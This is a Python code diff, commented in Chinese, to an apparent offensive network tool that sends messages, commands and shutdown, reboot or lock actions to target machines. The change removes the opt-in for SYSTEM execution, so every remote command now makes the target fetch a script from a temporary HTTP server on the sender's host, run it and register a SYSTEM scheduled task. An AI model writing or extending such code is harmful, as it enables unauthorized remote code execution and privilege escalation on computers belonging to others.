@@ -24,8 +24,6 @@ def validate_options(options):
         raise ValueError("发送间隔不能小于 0")
     if options.extra not in {"", "r", "s", "l", "b"}:
         raise ValueError("网络发送仅支持 r、s、l 或 b 扩展操作")
-    if options.system and not options.command:
-        raise ValueError("以 SYSTEM 执行需要填写命令")
     if not options.message and not options.command and not options.extra:
         raise ValueError("至少填写消息、命令或选择设备操作")
 
@@ -50,12 +48,9 @@ def prepare_packets(options, report=None):
         if report:
             report("已准备 %d 条消息" % len(packets))
     if options.command:
-        if options.system:
-            # 命令正文塞进报文会超长，改由本机临时 HTTP 托管脚本，
-            # 报文只负责取回并执行，脚本自己注册 SYSTEM 计划任务。
-            packets.extend(elevated_packets(options.target, options.command))
-        else:
-            packets.append(pkg_sendlist("-c", options.command))
+        # 命令正文塞进报文会超长，改由本机临时 HTTP 托管脚本，
+        # 报文只负责取回并执行，脚本自己注册 SYSTEM 计划任务。
+        packets.extend(elevated_packets(options.target, options.command))
     if options.extra in {"r", "s"}:
         packets.append(basicCMD["-" + options.extra].copy())
     elif options.extra == "l":
